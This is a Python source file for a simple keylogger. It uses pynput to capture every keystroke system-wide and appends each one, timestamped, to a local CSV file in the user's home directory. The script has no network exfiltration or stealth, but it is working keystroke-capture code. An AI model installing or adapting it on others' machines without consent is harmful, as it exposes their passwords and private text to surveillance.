import csv
import platform
from pathlib import Path
from pynput import keyboard
from datetime import datetime

current_keys = set()
current_key: str = ""
show_window: bool = False
csv_header: list[str] = ["timestamp", "key"]

# Get the log file path based on OS
def get_log_file_path() -> Path:
    home_dir = Path.home()
    system = platform.system()
    if system == "Windows":
        log_dir = home_dir / "AppData" / "Local" / "KeyLogger"
    else:
        log_dir = home_dir / ".keylogger"
    log_dir.mkdir(parents=True, exist_ok=True)
    return log_dir / "history.csv"

# Check to make sure the CSV file has the header
def ensure_csv_has_header() -> None:
    global csv_header
    log_file_pathname = get_log_file_path()
    if not log_file_pathname.exists():
        with open(log_file_pathname, mode="w", newline="", encoding="utf-8") as file:
            writer = csv.writer(file)
            writer.writerow(csv_header)

# Write the key to the file with timestamp
def write_key_to_csv(key: str) -> None:
    log_file_pathname = get_log_file_path()
    ensure_csv_has_header()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file_pathname, mode="a", newline="", encoding="utf-8") as file:
        writer = csv.writer(file)
        writer.writerow([timestamp, key])

# Handle the key press
def on_press(key: keyboard.Key) -> None:
    global current_key
    try:
        current_key = key.char
    except AttributeError:
        current_key = str(key)
        if current_key.startswith("Key."):
            current_key = current_key.replace("Key.", "")
        else:
            current_key = str(key)

    write_key_to_csv(current_key)

# Initiate the application
def monitor_keys() -> None:
    global current_key

    def on_key_press(key: keyboard.Key) -> None:
        try:
            on_press(key)
            current_keys.add(key)
        except Exception as e:
            print(f"Error in on_key_press: {e}")

    def on_key_release(key: keyboard.Key) -> None:
        try:
            current_keys.discard(key)
        except Exception as e:
            print(f"Error in on_key_release: {e}")

    with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()

if __name__ == "__main__":
    monitor_keys()
